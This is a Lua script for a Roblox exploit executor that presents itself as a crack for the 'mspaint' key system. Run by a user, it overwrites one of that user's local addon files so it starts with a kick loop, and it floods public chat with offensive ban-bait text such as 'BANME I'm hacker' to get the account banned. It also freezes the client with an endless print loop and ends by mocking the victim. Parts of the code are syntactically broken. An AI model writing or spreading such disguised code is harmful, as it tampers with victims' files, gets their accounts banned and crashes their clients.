EditAddon = function()
    if (isfolder("mspaint")) and (isfolder("mspaint/addons")) then
        if isfile(listfiles("mspaint/addons")[1]) then
            a = listfiles("mspaint/addons")
            b = a[1]
            c = readfile(b)
            delfile(b)
            writefile(b,[[while true do  wait(0.0000000001);game.Players.LocalPlayer:kick("Are u stupid or something?") end ]])
            appendfile(b,c)
        end
    end
end
--[[deletemspaint = function()
    if isfolder("mspaint") then delfolder("mspaint")
end,]]
banacc = function(isreal)
    if not isreal then return else warn() end
    local textChannelContainer = TextChatService:FindFirstChild("TextChannels")
    if textChannelContainer then
        local general = textChannelContainer:FindFirstChild("RBXGeneral")
        if general then
            for i = 1, 20 do
                task.spawn(function()
                    pcall(function()
                        general:SendAsync("我要吃小孩 qq 微信 roblox是垃圾 注入器万岁 exploit happy SynapseShit lolol SZFvv loser yellow BANME I'm hacker robux is fully shit")
                    end)
                end)
                task.wait(0.1)
            end
        else
            warn("你这作品不能聊天？？")
        end
    else
        warn("你不加载怎么加载脚本")
    end
end
lagclient = function()
    while True do
        print("我要吃小孩 qq 微信 roblox是垃圾 注入器万岁 exploit happy SynapseShit lolol SZFvv loser yellow BANME I'm hacker robux is fully shit")
    end
end
Crackmspaintkeysystem = function(isreal)
    EditAddon()
    banacc(isreal) 
    lagclient()
end

getgenv().MspaintKeysystemRemove() = function()
    Crackmspaintkeysystem(getgenv().isreal)
    print("No free 白嫖没有好下场 lol")
end

